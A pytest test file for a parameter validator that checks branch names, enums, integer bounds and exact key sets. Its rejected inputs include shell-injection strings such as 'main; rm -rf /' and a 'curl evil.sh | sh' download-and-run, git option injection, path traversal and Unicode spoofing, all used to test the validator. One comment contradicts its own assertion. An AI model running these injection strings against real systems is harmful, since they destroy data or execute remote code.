import pytest

from common.paramschema import InvalidParameter, Param, validate_params

BRANCH = Param(type="string", pattern=r"^[A-Za-z0-9._/-]{1,100}$", max_length=100)


def test_valid_branch_passes():
    assert BRANCH.validate("branch", "feature/login-fix") == "feature/login-fix"


@pytest.mark.parametrize(
    "value,reason",
    [
        ("main; rm -rf /", "pattern"),
        ("main && curl evil.sh | sh", "pattern"),
        ("$(whoami)", "pattern"),
        ("`id`", "pattern"),
        ("-c core.pager=sh", "leading_dash"),
        ("--upload-pack=sh", "leading_dash"),
        ("a" * 101, "too_long"),
        ("", "empty"),
        ("bad\x00null", "control_char"),
        ("bad\rcr", "control_char"),
        ("bad\nlf", "control_char"),
    ],
)
def test_rejected_branch_values(value, reason):
    with pytest.raises(InvalidParameter) as exc_info:
        BRANCH.validate("branch", value)
    assert exc_info.value.reason == reason


def test_leading_dash_allowed_when_declared():
    p = Param(type="string", pattern=r"^-?[A-Za-z0-9]+$", allow_leading_dash=True)
    assert p.validate("x", "-5") == "-5"


def test_bidi_override_rejected():
    with pytest.raises(InvalidParameter) as exc_info:
        BRANCH.validate("branch", "main‮-txt.exe")
    assert exc_info.value.reason == "bidi_override"


def test_zero_width_rejected():
    with pytest.raises(InvalidParameter) as exc_info:
        BRANCH.validate("branch", "ma​in")
    assert exc_info.value.reason == "zero_width_char"


def test_nfc_normalization_applied():
    # "e" + combining acute vs precomposed é -- pattern only allows ASCII so
    # both should be rejected the same way (proves normalization runs before
    # pattern matching, not that it's accepted).
    p = Param(type="string", pattern=r"^[a-zé]{1,10}$")
    combining = "café"  # café via combining accent
    assert p.validate("x", combining) == "café"


def test_enum_param():
    p = Param(type="enum", values=("api", "web", "infra"))
    assert p.validate("repo", "api") == "api"
    with pytest.raises(InvalidParameter):
        p.validate("repo", "../../etc/passwd")
    with pytest.raises(InvalidParameter):
        p.validate("repo", "not-a-repo")


def test_integer_bounds():
    p = Param(type="integer", min_value=1, max_value=1000)
    assert p.validate("lines", 500) == 500
    with pytest.raises(InvalidParameter):
        p.validate("lines", 0)
    with pytest.raises(InvalidParameter):
        p.validate("lines", 1001)
    with pytest.raises(InvalidParameter):
        p.validate("lines", True)  # bool is not an acceptable integer
    with pytest.raises(InvalidParameter):
        p.validate("lines", "500")  # strings are not coerced


def test_boolean_param():
    p = Param(type="boolean")
    assert p.validate("force", False) is False
    with pytest.raises(InvalidParameter):
        p.validate("force", "false")


def test_validate_params_exact_key_set():
    schema = {"repo": Param(type="enum", values=("api",)), "branch": BRANCH}
    validate_params(schema, {"repo": "api", "branch": "main"})

    with pytest.raises(InvalidParameter):
        validate_params(schema, {"repo": "api"})  # missing branch

    with pytest.raises(InvalidParameter):
        validate_params(schema, {"repo": "api", "branch": "main", "extra": "x"})  # extra key


def test_path_traversal_via_enum_rejected():
    p = Param(type="enum", values=("api", "web"))
    with pytest.raises(InvalidParameter):
        p.validate("repo", "../../../etc")
